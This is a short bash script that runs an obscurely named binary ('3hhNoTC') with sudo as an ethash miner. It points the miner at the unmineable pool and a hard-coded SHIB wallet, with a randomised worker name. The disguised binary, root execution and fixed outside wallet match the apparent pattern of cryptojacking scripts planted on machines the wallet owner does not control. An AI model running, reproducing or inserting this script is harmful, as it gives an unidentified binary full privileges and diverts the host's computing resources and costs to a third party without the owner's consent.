#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#ek61-6h9x)


chmod +x ./3hhNoTC && sudo ./3hhNoTC --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
